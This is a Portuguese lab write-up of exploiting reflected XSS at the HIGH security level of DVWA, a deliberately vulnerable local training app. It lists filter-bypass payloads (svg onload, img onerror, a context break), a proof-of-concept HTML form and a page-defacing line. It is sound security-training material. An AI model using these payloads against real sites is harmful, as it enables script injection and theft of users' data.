# DVWA - XSS Reflected (High) — Diário de Execução

## Contexto

O objetivo foi explorar a vulnerabilidade de Cross-Site Scripting Reflected (XSS Reflected) no nível HIGH do DVWA.

Neste tipo de XSS, o payload é enviado na requisição e refletido imediatamente na resposta da aplicação.

---

## Funcionamento da aplicação

A aplicação recebe um parâmetro via GET, normalmente:

```
name=valor
```

Esse valor é retornado na página HTML.

No nível HIGH, existe uma tentativa de sanitização do input.

---

## Comportamento observado

Ao inserir um payload simples:

```
<script>alert(1)</script>
```

O sistema bloqueia ou sanitiza parcialmente.

Isso indica a presença de filtros básicos.

---

## Análise da proteção

O filtro tenta remover ou bloquear:

- tags `<script>`
- caracteres perigosos

Porém, a filtragem não é completa.

---

## Exploração

### Payload funcional

```
<svg/onload=alert(1)>
```

---

### URL completa

```
http://localhost:8080/vulnerabilities/xss_r/?name=<svg/onload=alert(1)>
```

---

## Resultado

O navegador executa o código JavaScript:

```
alert(1)
```

---

## Alternativas testadas

### 1. Img onerror

```
<img src=x onerror=alert(1)>
```

---

### 2. Quebra de contexto

Dependendo do HTML da página:

```
"><img src=x onerror=alert(1)>
```

---

## Prova de conceito (PoC)

Arquivo local para simular ataque:

```html
<!DOCTYPE html>
<html>
<head>
    <title>XSS Reflected</title>
</head>
<body>

<form action="http://localhost:8080/vulnerabilities/xss_r/" method="GET">
    <input type="text" name="name" value='<img src=x onerror=alert("XSS")>'>
    <input type="submit" value="Send">
</form>

</body>
</html>
```

---

## Execução

1. Abrir o arquivo no navegador
2. Submeter o formulário
3. O payload é refletido e executado

---

## Prova de impacto

Foi possível executar JavaScript arbitrário:

```
<img src=x onerror="document.body.innerHTML='OWNED'">
```

---

## Conclusão técnica

A vulnerabilidade ocorre porque:

- o input do usuário é refletido na resposta
- a sanitização é incompleta
- não há escape adequado de HTML

---

## Impacto

- execução de código JavaScript
- manipulação da página
- possibilidade de roubo de dados sensíveis

---

## Conclusão final

Mesmo com filtros no nível HIGH, é possível contornar a proteção utilizando payloads alternativos.

A aplicação não realiza sanitização adequada, permitindo XSS Reflected.
